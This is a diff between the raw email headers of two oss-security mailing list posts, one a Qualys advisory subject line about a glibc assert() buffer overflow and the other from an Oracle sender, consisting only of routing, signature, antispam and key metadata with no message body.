@@ -1,4 +1,4 @@
-Received: (qmail 1495 invoked by uid 550); 22 Jan 2025 13:41:51 -0000
+Received: (qmail 17978 invoked by uid 550); 18 Apr 2025 18:55:18 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -8,626 +8,473 @@ List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
 x-ms-reactions: disallow
-Received: (qmail 1440 invoked from network); 22 Jan 2025 13:41:51 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=
-	content-type:date:from:message-id:mime-version:subject:to; s=
-	qualyscom; bh=99Ux+C8cpFXYCu28AtFLRedjC2OMfUNZ4F9HqAsaHb8=; b=Jg
-	LmYDloosTSToRHEUYqW+YtRpXu8/wmJzXgwyQVmjFX3VqNj6A2PqQkJhw5+eYTHG
-	ps5FYULjRn3n9ZQ6IbXherKYpUQRTHlkhjdAShEQmLhUhvBadEbcj5uXqqGDo1YI
-	hG62wymEg3PGSfmNi+bV9S8O7vjfTLd5kPZi0cqGPL09xB8VtTyIQJRodFqvdAqY
-	Qa0FSkqtRDyYgbe0JrbyMtRuZZ30aJdl5J/UZsLqk+Z7i7ogvkQyGQ7Nyvsu3Jhp
-	zPG63WyNCsk/GwLg1XFridi+fOEI2ZA18yS1Pdf00PeUcXVcRKSPtT8fHrm15Sbi
-	xVepHlbMwMUUar3s/PBQ==
+Received: (qmail 17939 invoked from network); 18 Apr 2025 18:55:18 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=
+	content-transfer-encoding:content-type:date:from:message-id
+	:mime-version:subject:to; s=corp-2023-11-20; bh=N75Je7kUykdTxxmE
+	MNgvX0ceNTC1Yee8u+bdu6tWEYE=; b=UeIiahvC6Jx9OlEm4az9E3Pq3waoNgkH
+	jTkcumitsCqawJV7s3bz5XgxZin2pkEywpy4UqeIFoVr3fdX8kf/sKJCvYbvrc8P
+	A1VVLYRv6zGHY38FSPoLAP2+QMdhfM910Jdruekhh2sS9yadvN9jY5PUSVKAE0rm
+	2qOsFi/H7XVH5TsZ1BTBEJMIaAtFyBCOGQFhq/c5MQiTkdc9RnzD5on1j6Z4s97b
+	xCkXiwJnEkCtbhoZGBUv3ngIuO9rlE6NZhLt4L7ENJnOOdr4ylk4WDqDhVqbuC02
+	fqsapDXPb3uU2yXc6N133E0bHtgmHo5c059oSTb+JMHqy+PGk91oMQ==
 ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=nSlDB9jECKlWv5HKgwBoL/VEgJAGrfTLICA9mXwgKXKI3N/5OOylWVQlDu6yDLw7DGVy3iIUFCZRdWwi6NUQ1YjXuH2BpuZLp9kLGdfbH65Pz8Fcui811O8BylVK1jny8tKPgBGhc1RoG2IWwiJhHgZWUeh15/J5oYCUf4lIdUNednqaU/6qyZqU8PyI01SgQ20nYwOlh5N4c+BzvhSllXIivQ0pxJbTJAnnrTbX4IB6zAg+kRtyuiW5AGobuGt4oSxv9JkgyRO6Vd+x1Y/86YkUWSHIhCtia1Z1hNsPFiDOfpX9gu7OA1dkLz/CTBTnbmcA6A2CHsdtXmhXCCy4lQ==
+ b=GB2rTRHnWQg+cni08SnVAtpemfI9hY98N4WwLHy/5cTVgO5RP765hxZ7b/2N3Fu6/9MZ5kAz+AohWnupxAOLZWqfxJRog81CgnDoMDpzGNffvmwq9FWbzvRiijJTo6di2AA0I32iX8BkWFgAEf4+z53uW1nZn4Mgt4CsYYdH6uh9683uhXun6se3RZSY8YXo6SnU8VhX+JACpt17UxT333zbYRcBOcD/ZIJHAlbbUZbCMqIDN/K4Av1ZiP0DNDp8NgJ0kPH+JjIaRdNCSGfoOXRvv+mAKA9fTh/wsoRM56lShzF48odPUVjhl2VqFcL9Fy4jHVZlwgQxVf3J9TD0Gg==
 ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
  s=arcselector10001;
  h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=99Ux+C8cpFXYCu28AtFLRedjC2OMfUNZ4F9HqAsaHb8=;
- b=H1ccWTHZcOBQLsV0RK97QtZNcEY0muSnGDey2Ty7hPnlafJThTUUnKXB6NtCbdCC0bkKG6P9d/WzmBMcNzxXvZyr9DVK46a0KCA6eANuZBANPKSawcNU84E/SKVZz7i8IYLVxPxaoSQp5pPfYr/spRLWDLWV17nILM0ujcWeJbTFwMHbmcZCCJa8CtPH557Y5L9YprnqODqoH1omSwQpKMRcRSl0JlqBjC92MTdEUoK+aaV2WFemWQ28hPxPVgkq3IwauVRh9H3/vwaEJ0AukRuQ+9kyeg5qVoEAKIdOsZ09efyylE1E3rT8G9qEldZFwpEALRxZ7rtkyQVn+AN1Uw==
+ bh=N75Je7kUykdTxxmEMNgvX0ceNTC1Yee8u+bdu6tWEYE=;
+ b=SA+NFB+rSeDI8OuTZArml5mJyT35hrn+JSRqOFalXbl9nenTEyYQ9FW+P1Kr5SW2Exu633XyDMGzB34zJ5BaVab/kUcnjUBW8F4kX2IGc77l07LXowxdeQUwVc5E6M9S+xZ0dEYyu1sfdUJ23MeazLKjlaheM08ee5KgNFashaM8rfNbBYMjIfF5LYqyjstVjTtG9A80zvPf1CAIELi9CUXuPwK7QWsvyCcjR48+w5El5SzwAXgCVJnb8LUvLwW5wUPYz/ZUexWIYlu/HynfCP9480JOsjvNmldCj/X6Dc+9NwNJ3TIbK4UbQLyLs5YkfuoQYyZbeqUAXg/xjVS7qw==
 ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
- dkim=pass header.d=qualys.com; arc=none
+ smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
+ dkim=pass header.d=oracle.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
+ d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
  h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=99Ux+C8cpFXYCu28AtFLRedjC2OMfUNZ4F9HqAsaHb8=;
- b=RpUp2FPml7TnZi5jAG+SB+9OFO+6QzZPjKWbGB4QizrsfEYF26R2O+/egox2GbQByyaggjHiedrnFrJ7hYrCrJU5d0Z9p8OVEmBC/OarN2stdfJd8CTQ1G8mJYlkmyZf8SAgXjLZbTANuHZVmMuqgHQ/DhAMPBu2kADa/AnySgRxMO0tSVvz0XlvDn1P3iw3hzpAoXsvqhDcCD+eiTp/EZtfzfGRdxBVDG47fwqYhs+g/S0DDgOZKQEpfoMLFNnLTM3yoVbK7CvwsaoRZDv0Ag9Ffsn4v/NntfaWuABAso1qFp/ijQ7beoLf4Cz49sFIJox13VDDWVln++h7ldz8Ig==
-From: Qualys Security Advisory <qsa@qualys.com>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Thread-Topic: CVE-2025-0395: Buffer overflow in the GNU C Library's assert()
-Thread-Index: AQHbbNNbZRguQNWsWkGl8AAXT8Ti0Q==
-Date: Wed, 22 Jan 2025 13:41:36 +0000
-Message-ID: <20250122134128.GA29327@localhost.localdomain>
-Accept-Language: en-US
+ bh=N75Je7kUykdTxxmEMNgvX0ceNTC1Yee8u+bdu6tWEYE=;
+ b=BJyRHFOJH+wH+KUjyYhRhthIo0U3j+jkd2SynU06hmc+5D9RjNe/Ng8Tw6zl9XMu9hRWnPl9o8j4wrUNLE5bV7lpquobbf9CIgBmNCfNSsCgDqGaiGLOteCjquQ1quvZRRbzW+sUTrUscQbD87V77ekliQGBoK+ubY2seaLmqHM=
+Message-ID: <cc283d3e-5a45-400b-97d6-78dc176fe4bb@oracle.com>
+Date: Fri, 18 Apr 2025 11:55:01 -0700
+User-Agent: Mozilla Thunderbird
+From: Alan Coopersmith <alan.coopersmith@oracle.com>
 Content-Language: en-US
-X-MS-Has-Attach: yes
-X-MS-TNEF-Correlator:
-x-ms-publictraffictype: Email
-x-ms-traffictypediagnostic: SJ0PR06MB6910:EE_|BY5PR06MB6499:EE_
-x-ms-office365-filtering-correlation-id: ce5914bf-b058-437b-a7cc-08dd3aea7e08
-x-ms-exchange-senderadcheck: 1
-x-ms-exchange-antispam-relay: 0
-x-microsoft-antispam: BCL:0;ARA:13230040|376014|1800799024|366016|38070700018;
-x-microsoft-antispam-message-info:
- =?us-ascii?Q?mXkzsMipv+lUUVvbqfBjClJORMzK4G3MoMs/d1cP5qBNAk0SmpJk/n/UfIRh?=
- =?us-ascii?Q?3rJEtjfZ0iRj2IXud7BtvRt3VKLBGKhxMiyhgNl1Q24LepndgdAr5xIFXy8i?=
- =?us-ascii?Q?KGqhH8kl4siAv7YHzAuuwGKrW2y5ANE4IFuhnKzl1eMS5efwg4Yllu6ItK+c?=
- =?us-ascii?Q?VywXyNRl0eyLDo6RyZbdBahaK+rRBGQQ9rqBR5sZ5txlBk9wQbk9lUw9SVNo?=
- =?us-ascii?Q?OjP6Osa/xkI4svjYOJbWYrINyeyZWK49QKt8O7GThMcEbo+TtSypgrbVN/yb?=
- =?us-ascii?Q?dZFz7ufy9sTd6SPf/smwe4QHp6oiqJ8hByGGZ89SRzGh7haVfmf6WtLcRyex?=
- =?us-ascii?Q?rxqUEhY7RtcCpoSZDUOInoeE2sOCmY6JWQ0An238obX2z0/HFPooXR4BbjhV?=
- =?us-ascii?Q?lF27oKjpRBarkoi16iHDy9ULd13ulJvLSYpGyDTim85xqE1YXXA3Za0X21UT?=
- =?us-ascii?Q?N+BqHYk6u2iD5y63TnmGKfxG1aVXL5TXrwNAnaJqoE9ot6TAkMyNyC6a2xq6?=
- =?us-ascii?Q?mKecsZt3NpA78EiRDFEsP+H9K2m4RlZ5fHXX8EYtPshrd/2IfkSmZfpZHaBB?=
- =?us-ascii?Q?zDhij0Q6314+d9pJoLs9oNawraSHnpN4JeLXnu8dkTfrTt2ZroY829ufLJ1A?=
- =?us-ascii?Q?f4lWfoGHwCJ4Rk3W8y1cd5JYA87W+VhGRyG62cRnw41ZmKc0XkKOq1wU6wEn?=
- =?us-ascii?Q?/b3wOkY0uFksVSQMhYW2jA6Jzek7XbzuOS/ohjM71HQGqxsR4UcSG8LgojFW?=
- =?us-ascii?Q?inlHgRGeOSK3EHIJ29GxubZF+5a0NS79j6UXibDVtzpz/Qm/5IRY6jsYhQYn?=
- =?us-ascii?Q?m1zhkP3q33sXU5vAduvt90G+MNRgwsmADiZGpda5RmDx7qBhGT6UFvEg6Unp?=
- =?us-ascii?Q?3EcDkZy7BAtkinv/sKynlPtRL4P/gWauRwN2+t7MNxj8HXSZynFfAKwjG3j9?=
- =?us-ascii?Q?/kcLTi8n+2RT6r7VpNkfCgd52UvWCCCQ4KJiH0SRmuK93UeIUqd81U7/EXal?=
- =?us-ascii?Q?/QV6JY+nXVuUxRFqkQLNnF5bYtibyHNkVyLHYiAaSYb5STbAhXu16LfL/zyj?=
- =?us-ascii?Q?Lp35Ic46X22M29i2YRHSQRuMASMS61PLWOdIjbEvcKCH+k0QG49v1B1FXQe+?=
- =?us-ascii?Q?5jcCaoZRZN+JBzwFryFaDPhrnyV+SfXoLkDekZCVEpJmZp2GG3sO4j88V13V?=
- =?us-ascii?Q?VTJp8BaXaGD/6ejF5ECDstWysM1XQia2koS8aeJLDfWltjyzKyi3Hs1U98Ro?=
- =?us-ascii?Q?JSa6RjR0Wbx8++Bx++iiLAviiZM1d5KfytVBaYsuJ8vVGwGzp4XlY2AuxMOu?=
- =?us-ascii?Q?r43ARcU9EwhCb4X9AOab7AHr0zBOfdYx1raIXVaStX50Ab1oZoqnC4FP038l?=
- =?us-ascii?Q?Oi7rCF8S5gvKdBsRqzbgeOMgINVh4HlwKiUxx0wypAKYDKoDRA=3D=3D?=
-x-forefront-antispam-report:
- CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR06MB6910.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(1800799024)(366016)(38070700018);DIR:OUT;SFP:1102;
-x-ms-exchange-antispam-messagedata-chunkcount: 1
-x-ms-exchange-antispam-messagedata-0:
- =?us-ascii?Q?NSwrobqr7CvWnrlE+xvHtF8jS+sY7w6Fn/HGcTl7AN7AeHNpkLnQAuqdIA+x?=
- =?us-ascii?Q?r2SJeEnMhaSsusotuACIyF8dLZtLqa3SS8VScJccTk5obSt74VdSTkIv2JR2?=
- =?us-ascii?Q?Sb2y/4Btrg3vm4H/3AKYu/ctFObiP3VYBtRMnsgliqvBl0RT5LiCyB/uBjBi?=
- =?us-ascii?Q?sTvgl6XzNEoPYGWYFLrbJOqC6ZY2wdWUYudtknKwjpxlQuD73JO+JP0kbkXB?=
- =?us-ascii?Q?BY6Z3SM6Va33VzMCZBRc1kT/zErTE+9Dmzy97BHL9xYj8OuKfAwWwW1e1iUo?=
- =?us-ascii?Q?NCZ8/38EzfwGptgkM/RZCqNmSPa4lVH5dCcmig5EVuAp+mOvFUBwfYXwesYH?=
- =?us-ascii?Q?yInELyHJ8UC4mI6dfefx9CdkH/0yhB5kLetxtV31mytPtvwYpMKPVl802/ub?=
- =?us-ascii?Q?sEd0tvcHA5LnQOB3oEHDIP37TxMnNQXeJoSBjsML7MeghZfG9XNQ6Hjpy2BY?=
- =?us-ascii?Q?axQAJiWDOCHGEILSYdlwLtTKIS2xEXnYcIbWKsRXROOCiTUIqW7zPTxEWQSy?=
- =?us-ascii?Q?JkLDZ4h6IuRk86YWmgj0TUiZN8RGJezwe7jBKDXAantWv9MBIF34oolVQwuI?=
- =?us-ascii?Q?SLw0KOTzQfXKShqrsUCfJBxS0dRKnnuGLOG0zhHqInPXLcU5kqlsVs3A5989?=
- =?us-ascii?Q?zXpMilot9YpHvitfrwCDvhb2UzX4ipYD5/LGLalE6dFXRdCRAVmUWMtT3oI4?=
- =?us-ascii?Q?OMRb4we+A57OPSjcNk2TRkf+40HE7Yd1HDFStuEtJC4dOL+MIV7Xv/y/oWBw?=
- =?us-ascii?Q?ot/RoQfyIv//qulEGTuWtPTgA/h6axtjUWWBB9irGLe+7ursp51sZM+KgRqx?=
- =?us-ascii?Q?lV6km3Zejt+5jlHb1dvfEJ6b6gGoNr0Nnh9YSQTsRZKVCLGrHIpXhM5hTeeD?=
- =?us-ascii?Q?2xRo//Jtt9bVzWnB2mP6m9N+N0+5i5jeVZoceNQoJm/Lzj7kH9GpkaMxpjsc?=
- =?us-ascii?Q?n/ln28aFpr5XxrI2YIVnvsfkxopGhpGerXZcLYZbkjHVyfDbHLtbbjujOHYy?=
- =?us-ascii?Q?Gf4CzZAgwMVBfpkqyU9Nb3KXSrezCXBMLKoaZEDJeCmGTJ8d70YTiy1tIjct?=
- =?us-ascii?Q?UGBBoLLi1E/jJf9CDhnpdXGGIyOIfwjgiQHhnvKHce1gL4WxuwsyBlDQhYUA?=
- =?us-ascii?Q?OsNVLyXha1IU4CaD8iQyLvhDODBswJITD19QKIFD6mFsa4zAgIb0ylssdQAI?=
- =?us-ascii?Q?LWG4sA0Qn8yLKVakCVRgnE8jN6f36uUmynha8MniegjMo+P40JVdyvg7BAXl?=
- =?us-ascii?Q?rF0bC3P22xml82L3sAOBc+6H18sQnvP0h5waRH0rvYGkObCO6PnreVtw75Ux?=
- =?us-ascii?Q?p2EKlsC1drp/9Joh6QuQKMGVoWKXTv5LRMx5K1JpM9kFLp75YZztpE8JZGZd?=
- =?us-ascii?Q?ayU9EA17pPX7HG9s++wZyPZWQJv9Ld2SuEU9oiQvRmrpnSscdIK8z0hYjhU0?=
- =?us-ascii?Q?fuOcRN1QMerAdlKUVm7evj7k7k5Y/4aCH/Lf6QGM8z6TvrZiz/lGlOXg8jN4?=
- =?us-ascii?Q?18soKQ35XryQgrS6vy5B6T72fCpdsnJREgEoDf/A6kEUsBEYXqQaqqx5RJVP?=
- =?us-ascii?Q?cujfI+MWWPT9bxMG/VSHUvmrLMChIFYHjcJQCGgOPQmnABF3PHP+lSpOqcDo?=
- =?us-ascii?Q?MQ9xkmmu86DtqJ83678NICg=3D?=
-Content-Type: multipart/mixed;
-	boundary="_002_20250122134128GA29327localhostlocaldomain_"
+To: oss-security@lists.openwall.com
+Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
+ xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/nZ1KboV9G
+ q5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2gEQfPiyBw+trIppWF
+ RV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdEa6f4uLqoNHP+m4yYnzapFuMD
+ /R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx98qUR473l4buXjHgDkkXXlHqdzil1vK85
+ PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwVPb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5
+ vR7PdjM32ZJCN2+aM4dYfNzQxQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJv
+ GAENBHSH1QjpZMJGCTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLB
+ ido3DtAETbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w
+ ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsKCBBMRCgBCAhsDBgsJCAcD
+ AgYVCAIJCgsEFgIDAQIeAQIXgAIZARYhBEoZPAbTXnxnD6TvC6L7nggfLRMOBQJkQs2eBQkn
+ DNS0AAoJEKL7nggfLRMO1esAnR4FVD60BpDY/bJp5RC1VXhOVlo4AKCJgsQeVeGLxDlMuhAm
+ bcCkOjafqc7BTQRGm/pvEAgAmnlpSWGjmtSGlLqKTuymwBAU9G7Jw8ow27QngXS/86g/PTzm
+ yhXzK0uPgeoIaTZlqaHWNKCWJnC6T2btXtaDHH6cElrClYNf94os5sSt8PBDh184W+NtctAy
+ Y2dA1pQYhYs8/eXwa4E4cyrrQG75M+CHrbu9Se0vlERARCpNcjNYLpTXRCwNuUvAi905VJ0Y
+ XnGX83WbJfNIq+uxnBa2gVzwb2/2FwKOG03Wyb1vs6NznWJle9x61y8/LlEDoBRbfIQTFp51
+ R0ue8gX2yMVgh8lYVViHYCBq+cat7p8X41Xa/fN/HfBFPsf3/+bhggNgmaBmDJBxxd6BPB8Y
+ EireiwADBgf/UWIxQwwRLkiXPacOoh34MJYQIBTrCC8gVFxetlbEPEH5mueZMJegAPTF52l8
+ 6REenxdNVz/0xT7BD6VlHHY5DowlbRca4W8eb3gpkX/wfNYDYCHtTifT7ewumTrNZx5mrbNk
+ 0XTJVOPAP3z7E0rVD2w/xo4p22DzIwfeGKwpHqt1b6Z9fmrRDwaiXaFmwUf+rIiGc/OFcOSe
+ 46HwTmIyTOt6NVdQSf75jOPbdeM/n1I5svOdWTLEj6QEj2q9UQ98UEPJuMdaotyBFwKlcDOO
+ LMSL793fWINrYSskdXhHjaht5wWqI+egO2JfciI/vP1+bEzhpY9llGq+r7WG3nCSf8JJBBgR
+ AgAJBQJGm/pvAhsMAAoJEKL7nggfLRMOgugAoIdhGnD9d/IS6fDVgv+4xnOXvyohAJ0VVxc1
+ uoPzepWFbgvLuHIMvyjRog==
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
+X-ClientProxiedBy: SJ0PR13CA0186.namprd13.prod.outlook.com
+ (2603:10b6:a03:2c3::11) To DS7PR10MB5005.namprd10.prod.outlook.com
+ (2603:10b6:5:3ac::15)
 MIME-Version: 1.0
-X-OriginatorOrg: qualys.com
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: DS7PR10MB5005:EE_|IA1PR10MB6097:EE_
+X-MS-Office365-Filtering-Correlation-Id: f38b1ac9-0484-4fae-71b2-08dd7eaa8786
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam: BCL:0;ARA:13230040|366016|1800799024|376014;
+X-Microsoft-Antispam-Message-Info:
+	=?utf-8?B?S0xpakt5RFM1MXB1ZDFlYlVaNk0vU3RKWDNIeFBpamN2QWpqUXh2eHliMGFr?=
+ =?utf-8?B?UlBZRGxxUzdMRTFVcHFiNitWaGhSR29HY2w1ek9rMU9Db2NQbXByVGdEYndI?=
+ =?utf-8?B?OENFek02NU1HY1dnZERTTExjVTJVSkRyN0tvUklPRmVNdHd4MmhRNkNuUFA1?=
+ =?utf-8?B?UHJHVXk4Zjk1aHFUWmp6YmpzR3RaRE9vdXZwQUpCZHJ4L05ZUDVYNmhKV29X?=
+ =?utf-8?B?RzBCQ0UzS2RtazZ5SVdVdld4SjFUci8zMmJkMHBHSHBCc1pQakE3b1hnajcy?=
+ =?utf-8?B?cVFaZ2dRTENYTEhFUlNkUDFWOXF2UEZabjdtMUlOUkhJL1V5MkQxRWtYYVky?=
+ =?utf-8?B?UlRVUGgzcGhNMHNVdDNtZXl4RGQ2eFMyb0l5aHZUbzBIbWJ0RmRHdFlWM0Mz?=
+ =?utf-8?B?UWhMU25YZ29wd0s1U0ZDbHJOR2pVVjh3QXdnOE5QMUhidUsrWFg1S1p3ejhZ?=
+ =?utf-8?B?a0N0UFRqM3hSTWx3VDV0bXdjWEZxQWx4VWVjalpsNkgwa0dSWktVeUxVUnpz?=
+ =?utf-8?B?eGJ2d3Y3a29TaC9wMFUxNGI4Q0tQS1ZIbG1VaHBDVERMWnNibGd1Q3NySHVR?=
+ =?utf-8?B?KzVuUDZNOFZBL1oxRXQrNWMzZlhkNmxYUyt6Q1Jyb1YwQnhkWnVmQXVtRlcw?=
+ =?utf-8?B?VnZXR2hFUHRwUG9sdFhZU3h1TkFmUHpIbVJCVTFORnIwbjkwcldjcnYrVS9G?=
+ =?utf-8?B?N25XeGMxWkJ5eDY0aUZLa1JSZTZQc3RITkNkQXVJcXloSHhCSlN3RzhmR3pC?=
+ =?utf-8?B?MnF5OWEwaVRYUFZ1MXgza1hrTXVxQ29qbE5NZHJLR2g5bDJqcXp3S0tDZE9C?=
+ =?utf-8?B?ekh4ZEJqenBCUUsyWlNLbzBkNDJXb1VqUzlHV1dRUmxiZEN6Q0R3NWJrYkpQ?=
+ =?utf-8?B?Z0dndGRrMXFjS1I1YlNjQncyVVlCaDVyY1lnS3JaTkZYUG4ydnNjMlF3Zy9p?=
+ =?utf-8?B?Rmp2eDNKNDVyRStKbWZPZEZqMk1QMG1ITVhjUmxUaHZlaHhWN09id09VOHR3?=
+ =?utf-8?B?VmVMeTZyQVFQZW1IdTZkNlN5TENmVCtnOUQxOTZpZzRGRkRWMFRtVlBMWmVZ?=
+ =?utf-8?B?NHRqR25sd09QbXIyczVKVExXL1FTalZHbFlka01xSkJta25USzFMd2l6UC9i?=
+ =?utf-8?B?T05rbTRVOEhDbFBjTWxodUNzNjMwemFqMy8vZFBFYlBsT1FCRTJ4YVB1V1Jw?=
+ =?utf-8?B?YmMvOE1ZUDdJdHhZVlNMWU50eUYraEFRQmVrL2dKOUtYVXB3elQwUXpjcjRl?=
+ =?utf-8?B?T0lHMUc0Q2wxYkx5MUpiSWpYMWRlR3V1VE4zRjFHV2x1S2JUQzVMcW4vZzVT?=
+ =?utf-8?B?UnZsdVNYeXZoKzBGZi9SWVlGelV4NkRTNjNKd0NndjdTUkJmUE1nMUkxdEcx?=
+ =?utf-8?B?VjRCYkUzT1VWUnZSUUd2RnVhNnBJNXdsWHBVSVdtc2NRcExGbkgvQzkwVUVD?=
+ =?utf-8?B?eStIUDBsdUFlMHBtVHJ6aTBLaC9NUGUrRnJSTkNjRHU4MHhQNEkzS0lhZGR0?=
+ =?utf-8?B?bFVBbHh6VktISklzQ3Vwa0o5d1RmcHAwNGFEZUFYV1EyemoxVlNZb0hKdTVu?=
+ =?utf-8?B?Umw2RVQ0QjVMVVlFUm4rb3JmS3pxV3piMGFISGUzN081dWVhRUhwZEw5NDMx?=
+ =?utf-8?B?N05FZUJQZzhrTFlwUVV0aVlyMk0rTGFuc05IT3ozbXRRQXJoZ3hSS3NDTW1O?=
+ =?utf-8?B?aFQ3OFBMSXNMSEYwNDZDMnY2UHN4UnBnclhLbitob01uMjRJYWpaMnE2YWo5?=
+ =?utf-8?B?SjFva054K1BzK0xkRUtWWkZrU3lGb2xFNDl2ZUFQbmphVnc3RlJyZGtzeTRX?=
+ =?utf-8?B?UDQveHZLcUhpWXJuZDcvZ3FDSVFIZ1FzUEFja242NnZ3aVN1NFJXU2tzQURn?=
+ =?utf-8?Q?Jmg0+5id0bJ/R?=
+X-Forefront-Antispam-Report:
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS7PR10MB5005.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(1800799024)(376014);DIR:OUT;SFP:1101;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?utf-8?B?NTJHc3FQWEtkaEtmSFIrMjFCZ2MxZEFjY1BnTys5RjJIUTNPbE1acW5ESmkw?=
+ =?utf-8?B?cUFBTE50eHRhUk05dW9mSmhKcXRVVkdHUEpuQU9XdXNqUEMzTkZ3OTdQY1dQ?=
+ =?utf-8?B?bEgzNW5hNlRIbnovWmJCVVlldExwY2NBTVdnOWxoaXBOL25qaTlHM2JwVFM1?=
+ =?utf-8?B?WXhYcEpkNERuZGtmT2JWM0l2RVBvWk9tdnhydDVZMU1VT0NBM2xCbWNUU0sr?=
+ =?utf-8?B?MW5TUThyQnpUOXpMdGpDL0l5Q3pJYitmUnE2dElSc2NNTXFtdmNsS0pjcVY4?=
+ =?utf-8?B?bE5Rb1FWeDBoZnMzRzg4b2xSWThvbUlEckR2bnltRjFmVEptSzVBT1JBcHBp?=
+ =?utf-8?B?L0IwUlRwb0hLYng4bGxpTVhxVWUvSUNoVXpybU1RNTZWbEcyQWJzNG5BTkww?=
+ =?utf-8?B?SlNERU1xamFmK0Z1WVZEenFYYVVwRThJTzlCTXVVNFBvNGRFTTEyZ09aZStG?=
+ =?utf-8?B?RkphYmNzOUVPSzI5SFRLa1lVVGdXaFpjeWhKR2s5N0JGNXAyZTloeThoQW1Y?=
+ =?utf-8?B?T3RQTjJQZFFpNVI4K3Q5a3VlZkxEcDZ5RVE4cHBBYWcrZHdIaHM1OC9HYjVz?=
+ =?utf-8?B?djRVSEhFU0tOcGwwb1h1clBaUUFMZkNBWTk4RjZMKy9kcUp2K1M4a0s5Qzk3?=
+ =?utf-8?B?V09XbVZSUU1OSTB4VlNOL2xwS3V0ZHM0KzJDcmIzbzlOL2RqdXBrNjlTQVo5?=
+ =?utf-8?B?VUhFeW14YlJrOXF6V0Y0OHAvRjIxK3F5L0J1eHhoMXZxMERJTkRjeWNSWXp0?=
+ =?utf-8?B?TTNid0thNlJRZ1lzMGhYY2lBQmxpRlBIM0RNaE5SQ2JrQjFIVEtoRk1hamxH?=
+ =?utf-8?B?R1hqeHRvNEVmMUJYUnJ5blk2ZzBWV0tuMFNaOU0vUTFYczc4SjFjSVRleThL?=
+ =?utf-8?B?blRKWUtpVXNsYTBzWit0S0hieUE3blZYSTZtMlBRaXFBOEYxM21kRWpHNWRE?=
+ =?utf-8?B?ak9oa3JMRGdEYXpMQkJIRnM5eUEyektiMUI1U2w2R3dCcjQxdmZZV1UwTDFZ?=
+ =?utf-8?B?VWh3NnBHNnl5ZlVEUXUxUTRiMDBpUlRXSFR6WXlzYmovZ2NyemdncEpuUCtv?=
+ =?utf-8?B?c0xQMndJaTZSQmdzcW90N0d2eWppbUcwNDJSelFjaUZ1REY0TFJ3ZWpSRHJD?=
+ =?utf-8?B?VVFrejAxWkQwTnBBZEdnQ1prT2c2MTltaysrNVVNVCs0aXhGM3loM3ZMcXlp?=
+ =?utf-8?B?WTJLdGNscjdYZUNkNm1aRlJQWTRCU1BTZWtsQ1RkWVl2TUZ6RHNRMGxsNGRF?=
+ =?utf-8?B?VkZjL0xWT3MydVZyVVM5c3QyL0xGb0pEOHdqVEJVY3pBUUdwNVZkUzgvTG43?=
+ =?utf-8?B?RitoUWI4NjE3MTl1VHNDRE9BaVJtdnNYbWhZTW5XQzBVZjNleFh5a2FKSmJG?=
+ =?utf-8?B?dFBlNE1FK2NBajBoamhOQU5scFEyaGZiT3FSZmNRRTVhaFpZaWN3VDV1Yk1l?=
+ =?utf-8?B?SERXZEQzZ2dKMjkrUUREdllHNlJYbjZmQnI1OUdudFljVW9UMWlaQTNiR2FK?=
+ =?utf-8?B?eUJzQnFveUxTd1ExL3NnMEQ0NnZrR0dNcjh6MDUrbUdjNHBQVjY5Q0YzcTJt?=
+ =?utf-8?B?RHRVQmh2b25qTTU3SFI4ekp2T1BnVDBQTGdlejFJK0xGL2pwUXBXczVqamZ0?=
+ =?utf-8?B?YnFXSDlVNWNJTlBXc3daUkZSd01zUUNCY04zZXFVeUE5bEVXaFRNcHdxbnkv?=
